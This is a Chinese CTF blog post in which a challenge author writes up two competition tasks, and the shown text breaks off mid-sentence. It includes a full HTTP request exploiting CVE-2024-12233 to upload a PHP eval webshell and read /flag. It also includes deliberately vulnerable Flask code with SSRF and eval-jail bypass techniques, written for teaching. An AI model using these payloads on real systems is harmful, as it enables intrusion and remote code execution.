@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="写在前面 这篇文章不完全是 wp，也有一部分是对出题的感想，可以当成是碎碎念吧。但是为了方便师傅们看 wp 我会把两个部分分开来。 最近同时给两个比赛出了题：ISCTF 2025（新生赛） 和 Mini V&amp;N CTF 2025（V&amp;N联合战队的内部招新赛）就先写这些。以前还给一些比">
+<meta property="og:type" content="article">
+<meta property="og:title" content="近期的一些出题小记 &amp; 闲话">
+<meta property="og:url" content="https://lamentxu.top/posts/2025-12-10-19328800/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="写在前面 这篇文章不完全是 wp，也有一部分是对出题的感想，可以当成是碎碎念吧。但是为了方便师傅们看 wp 我会把两个部分分开来。 最近同时给两个比赛出了题：ISCTF 2025（新生赛） 和 Mini V&amp;N CTF 2025（V&amp;N联合战队的内部招新赛）就先写这些。以前还给一些比">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19328800/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19328800/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19328800/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19328800/04.png">
+<meta property="article:published_time" content="2025-12-10T11:46:00.000Z">
+<meta property="article:modified_time" content="2025-12-10T11:46:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/19328800/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>近期的一些出题小记 &amp; 闲话</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2025-12-22-hkcert-2025-web-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2025-12-06-2025-2026/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-12-10-19328800/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-12-10-19328800/&text=近期的一些出题小记 &amp; 闲话"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-12-10-19328800/&title=近期的一些出题小记 &amp; 闲话"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-12-10-19328800/&is_video=false&description=近期的一些出题小记 &amp; 闲话"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=近期的一些出题小记 &amp; 闲话&body=Check out this article: https://lamentxu.top/posts/2025-12-10-19328800/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-12-10-19328800/&title=近期的一些出题小记 &amp; 闲话"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-12-10-19328800/&title=近期的一些出题小记 &amp; 闲话"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-12-10-19328800/&title=近期的一些出题小记 &amp; 闲话"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-12-10-19328800/&title=近期的一些出题小记 &amp; 闲话"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-12-10-19328800/&name=近期的一些出题小记 &amp; 闲话&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-12-10-19328800/&t=近期的一些出题小记 &amp; 闲话"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ISCTF-2025-b-by-not1ce-board"><span class="toc-number">2.</span> <span class="toc-text">ISCTF 2025 b@by not1ce board</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mini-V-N-CTF-2025-check-in"><span class="toc-number">3.</span> <span class="toc-text">Mini V&amp;N CTF 2025 check_in</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="toc-number">4.</span> <span class="toc-text">碎碎念</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E7%94%9F%E8%B5%9B%E6%98%AF%E5%8A%9E%E6%9D%A5%E5%81%9A%E4%BB%80%E4%B9%88%E7%9A%84"><span class="toc-number">4.1.</span> <span class="toc-text">新生赛是办来做什么的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%88%E8%A2%AB%E9%9E%AD%E5%B0%B8%E4%BA%86"><span class="toc-number">4.2.</span> <span class="toc-text">又被鞭尸了</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        近期的一些出题小记 &amp; 闲话
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-12-10T11:46:00.000Z" class="dt-published" itemprop="datePublished">2025-12-10</time>
+        
+        (Updated: <time datetime="2025-12-10T11:46:00.000Z" class="dt-updated" itemprop="dateModified">2025-12-10</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>这篇文章不完全是 wp，也有一部分是对出题的感想，可以当成是碎碎念吧。但是为了方便师傅们看 wp 我会把两个部分分开来。</p>
+<p>最近同时给两个比赛出了题：ISCTF 2025（新生赛） 和 Mini V&amp;N CTF 2025（V&amp;N联合战队的内部招新赛）就先写这些。以前还给一些比赛出了题，太久远了，懒得再写了。</p>
+<h1 id="ISCTF-2025-b-by-not1ce-board"><a href="#ISCTF-2025-b-by-not1ce-board" class="headerlink" title="ISCTF 2025 b@by not1ce board"></a>ISCTF 2025 b@by not1ce board</h1><p>首先这是个新生赛。所以，<strong>我出题的目的应该是引导新生学习东西</strong>。最近做 XCTF 的 php 审计有点红了，想让新生提前学会看 CVE nday 的能力。于是就索性从自己水的 CVE 里挑了一个来出题：<a target="_blank" rel="noopener" href="https://github.com/advisories/ghsa-4rv2-mwgh-33gj">CVE-2024-12233</a></p>
+<p>CVE 官网的链接：<a target="_blank" rel="noopener" href="https://www.cve.org/CVERecord?id=CVE-2024-12233">https://www.cve.org/CVERecord?id=CVE-2024-12233</a></p>
+<p>好，那这个题的知识点就是：</p>
+<ul>
+<li>利用已知的 CVE 漏洞去复现在实战场景中的能力</li>
+</ul>
+<p>那接下来，我要如何引导新生学这个呢？</p>
+<p>我们都知道在 CVE 的披露过程中最有用的一般就是披露者自己写的 blog 或者 github repo。这种东西又叫做第三方披露（Third Party Advisory）。</p>
+<p><img src="/images/migrated/19328800/01.png" alt="image"></p>
+<p>那么，我现在是这个漏洞的提出者，我直接把指引放在我的 github repo 上就可以了。</p>
+<p><img src="/images/migrated/19328800/02.png" alt="image"></p>
+<p>因为我的目的只有让新生学习 CVE。所以，<strong>复现和黑盒探索部分不应该是难点</strong>。因此我这里直接在我的 repo 里贴了完整的包，并且直接在题目描述里贴了 CVE 编号和项目的原始文件。</p>
+<p>最后的 exp 其实已经写在仓库里了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">POST /registration.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8081</span><br><span class="line">Content-Length: 1172</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Origin: http://127.0.0.1:8081</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrHSdH2MF1kcJ6HUB</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://127.0.0.1:8081/registration.php</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrHSdH2MF1kcJ6HUB</span><br><span class="line">Content-Disposition: form-data; name=&quot;n&quot;</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">------WebKitFormBoundaryrHSdH2MF1kcJ6HUB</span><br><span class="line">Content-Disposition: form-data; name=&quot;e&quot;</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">------WebKitFormBoundaryrHSdH2MF1kcJ6HUB</span><br><span class="line">Content-Disposition: form-data; name=&quot;p&quot;</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">------WebKitFormBoundaryrHSdH2MF1kcJ6HUB</span><br><span class="line">Content-Disposition: form-data; name=&quot;mob&quot;</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">------WebKitFormBoundaryrHSdH2MF1kcJ6HUB</span><br><span class="line">Content-Disposition: form-data; name=&quot;gen&quot;</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">------WebKitFormBoundaryrHSdH2MF1kcJ6HUB</span><br><span class="line">Content-Disposition: form-data; name=&quot;hob[]&quot;</span><br><span class="line"></span><br><span class="line">reading</span><br><span class="line">------WebKitFormBoundaryrHSdH2MF1kcJ6HUB</span><br><span class="line">Content-Disposition: form-data; name=&quot;img&quot;; filename=&quot;basic_webshell.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_GET[&#x27;attack&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrHSdH2MF1kcJ6HUB</span><br><span class="line">Content-Disposition: form-data; name=&quot;yy&quot;</span><br><span class="line"></span><br><span class="line">1950</span><br><span class="line">------WebKitFormBoundaryrHSdH2MF1kcJ6HUB</span><br><span class="line">Content-Disposition: form-data; name=&quot;mm&quot;</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">------WebKitFormBoundaryrHSdH2MF1kcJ6HUB</span><br><span class="line">Content-Disposition: form-data; name=&quot;dd&quot;</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">------WebKitFormBoundaryrHSdH2MF1kcJ6HUB</span><br><span class="line">Content-Disposition: form-data; name=&quot;save&quot;</span><br><span class="line"></span><br><span class="line">Save</span><br><span class="line">------WebKitFormBoundaryrHSdH2MF1kcJ6HUB--</span><br></pre></td></tr></table></figure>
+
+<p>这样就能在<code>/images/test/basic_webshell.php?attack=</code>里传个马了。后面就直接在马里<code>cat /flag</code>就行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/images/test/basic_webshell.php?attack=cat%20/flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="Mini-V-N-CTF-2025-check-in"><a href="#Mini-V-N-CTF-2025-check-in" class="headerlink" title="Mini V&amp;N CTF 2025 check_in"></a>Mini V&amp;N CTF 2025 check_in</h1><p>现在，我要给 V&amp;N 战队的招新赛出题。那么，我的目的是<strong>出有区分度的题目，把有实力的新生选出来</strong>。就CTF来说逻辑漏洞应该是永恒的主题，所以我打算出个 python 的白盒题，考一些基本功的同时再融一个逻辑漏洞进去。</p>
+<p>题目给出的源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">I wish you a good head start.</span><br><span class="line">flag is in file namely &#x27;flag&#x27; in the same directory as this file.</span><br><span class="line"></span><br><span class="line">Good luck!</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">import flask</span><br><span class="line">import requests</span><br><span class="line">import ipaddress</span><br><span class="line">from urllib.parse import urlparse</span><br><span class="line"></span><br><span class="line">GENERAL_WAF_REGEX = r&#x27;[a-zA-Z0-9_\[\]&#123;&#125;()&lt;&gt;,.!@#$^&amp;*]&#123;3&#125;&#x27; # only two of these characters ;)</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">def general_waf(code):</span><br><span class="line">    # Why do you need so many characters?</span><br><span class="line">    if re.findall(GENERAL_WAF_REGEX, code):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def check_hostname(url):</span><br><span class="line">    # must starts with vnctf.</span><br><span class="line">    if not url.startswith(&#x27;http://vnctf.&#x27;):</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    hostname = urlparse(url).hostname</span><br><span class="line">    query = urlparse(url).query</span><br><span class="line"></span><br><span class="line">    # must only contain two of the restricted characters</span><br><span class="line">    if general_waf(query):</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    # must not be an ip address, so no 127.0.0.1 or ::1</span><br><span class="line">    try:</span><br><span class="line">        ipaddress.ip_address(hostname)</span><br><span class="line">        return False</span><br><span class="line">    except ValueError:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    return url</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;Welcome to MINI VNCTF 2025!&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/fetch&#x27;)</span><br><span class="line">def fetch():</span><br><span class="line">    url = flask.request.args.get(&#x27;url&#x27;)</span><br><span class="line">    safe_url = check_hostname(url)</span><br><span class="line">    if safe_url:</span><br><span class="line">        try:</span><br><span class="line">            response = requests.get(safe_url, allow_redirects=False) # no redirects</span><br><span class="line">            return response.text</span><br><span class="line">        except:</span><br><span class="line">            return &#x27;Error&#x27;</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;Invalid URL&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/__internal/safe_eval&#x27;)</span><br><span class="line">def safe_eval():</span><br><span class="line">    # check if the request is from the internal network</span><br><span class="line">    if flask.request.remote_addr not in [&#x27;127.0.0.1&#x27;, &#x27;::1&#x27;]:</span><br><span class="line">        return &#x27;Forbidden&#x27;</span><br><span class="line"></span><br><span class="line">    code = flask.request.args.get(&#x27;hi&#x27;)</span><br><span class="line"></span><br><span class="line">    if len(code) &gt;= 24 * 10 + 8 * 8:</span><br><span class="line">        # Man! What can I say. </span><br><span class="line">        return &#x27;Invalid code&#x27;</span><br><span class="line"></span><br><span class="line">    # Ah, if you get here, then your final challenge is to break this jail.</span><br><span class="line">    # Try it. Not as hard as it seems ;)</span><br><span class="line">    blacklist = [&#x27;\\x&#x27;,&#x27;+&#x27;,&#x27;join&#x27;, &#x27;&quot;&#x27;, &quot;&#x27;&quot;, &#x27;[&#x27;, &#x27;]&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;]</span><br><span class="line">    for i in blacklist:</span><br><span class="line">        if i in code:</span><br><span class="line">            return &#x27;Invalid code&#x27;</span><br><span class="line">    </span><br><span class="line">    safe_globals = &#123;&#x27;__builtins__&#x27;:None, &#x27;lit&#x27;:list, &#x27;dic&#x27;:dict&#125;</span><br><span class="line"></span><br><span class="line">    return repr(eval(code, safe_globals))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=False, host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到有一个很明显的<code>/__internal/safe_eval</code>路由作为 sink，然后他又有<code>flask.request.remote_addr</code>的限制，所以联想到上面的<code>/fetch</code>路由打一个 SSRF。</p>
+<p><code>fetch</code>路由有很多 WAF。首先这部分 WAF 是一些 SSRF 基础：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def check_hostname(url):</span><br><span class="line">    # must starts with vnctf.</span><br><span class="line">    if not url.startswith(&#x27;http://vnctf.&#x27;):</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    hostname = urlparse(url).hostname</span><br><span class="line">    query = urlparse(url).query</span><br><span class="line"></span><br><span class="line">    # must not be an ip address, so no 127.0.0.1 or ::1</span><br><span class="line">    try:</span><br><span class="line">        ipaddress.ip_address(hostname)</span><br><span class="line">        return False</span><br><span class="line">    except ValueError:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    return url</span><br></pre></td></tr></table></figure>
+
+<p>我们都知道在 URL 后面添加@可以屏蔽掉前面的信息。即：<a href="https://baidu.com@lamentxu.top/">https:&#x2F;&#x2F;baidu.com@lamentxu.top</a> 会指向此博客。因为<code>@</code>前面的<code>baidu.com</code>被屏蔽掉了。这个特性在实战中多见于 CSRF 利用。</p>
+<p>这样，我们可以通过构造 <code>http://vnctf.@</code> 开头的 payload 绕过对前缀的限制。</p>
+<p>接下来是检测 hostname 不为 IP 地址。也是很基础的内容了。因为<code>localhost</code>在此处也可以访问到<code>127.0.0.1</code>的东西而不是一个合法的 IP 地址。所以我们可以直接用<code>localhost</code>来绕过这个 WAF，由<code>app.run(debug=False, host=&#39;0.0.0.0&#39;, port=8080)</code>一行我们知道服务开在<code>8080</code>端口，所以我们通过访问<code>localhost:8080</code>即可完成 SSRF。到这里，我们的 payload 长这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.ilovectf.cn:30276/fetch?url=http://vnctf.@localhost:8080/__internal/safe_eval%3fhi=1</span><br></pre></td></tr></table></figure>
+
+<p>我们给 <code>hi</code> 传入值为 1。这样假设 <code>eval</code> 执行成功则返回 1：</p>
+<p><img src="/images/migrated/19328800/03.png" alt="image"></p>
+<p>没有问题。注意，此处需将<code>url</code>参数进行一次 URL 编码。否则会导致解析歧义（如参数里的<code>?</code>需编码为<code>%3f</code>）</p>
+<p>接下来是一个很简单的 pyjail。但是，在 pyjail 之前有个很头疼的 WAF，这也是此题的考点所在：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GENERAL_WAF_REGEX = r&#x27;[a-zA-Z0-9_\[\]&#123;&#125;()&lt;&gt;,.!@#$^&amp;*]&#123;3&#125;&#x27; # only two of these characters ;)</span><br></pre></td></tr></table></figure>
+
+<p>以上字符只能<strong>连续</strong>出现两次。</p>
+<p>我们都知道，HTTP 服务器会自动对 GET 参数进行 URL 解码（见 <a target="_blank" rel="noopener" href="https://www.rfc-editor.org/rfc/rfc3986#section-2.4">RFC 3986 Section 2.4</a>）。而我们对任意字符，都可以使用 URL 编码代替。但是，对应的 URL 编码器并不会对一些不会引起歧义的字符进行编码。具体见 <a target="_blank" rel="noopener" href="https://www.rfc-editor.org/rfc/rfc3986#section-2.3">RFC 3986 Section 2.3</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">For consistency, percent-encoded octets in the ranges of ALPHA</span><br><span class="line">   (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D), period (%2E),</span><br><span class="line">   underscore (%5F), or tilde (%7E) should not be created by URI</span><br><span class="line">   producers and, when found in a URI, should be decoded to their</span><br><span class="line">   corresponding unreserved characters by URI normalizers.</span><br></pre></td></tr></table></figure>
+
+<p>所以我们很少见到 <code>A</code> 被编码成 <code>%41</code>。但是，<code>%41</code>这样的编码虽然不会由 URL 编码器产生，但是却可以被 URL 解码器解码为<code>A</code>。具体，可以读一遍上述的 RFC 3986 文本。我们做个实验：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from urllib.parse import quote, unquote</span><br><span class="line"></span><br><span class="line">print(quote(&#x27;A&#x27;))</span><br><span class="line">print(unquote(&#x27;%41&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/19328800/04.png" alt="image"></p>
+<p>可以看到<code>A</code>没有被编码，而<code>%41</code>却被解码为<code>A</code>。</p>
+<p>注意到<code>/fetch</code>路由访问时：</p>
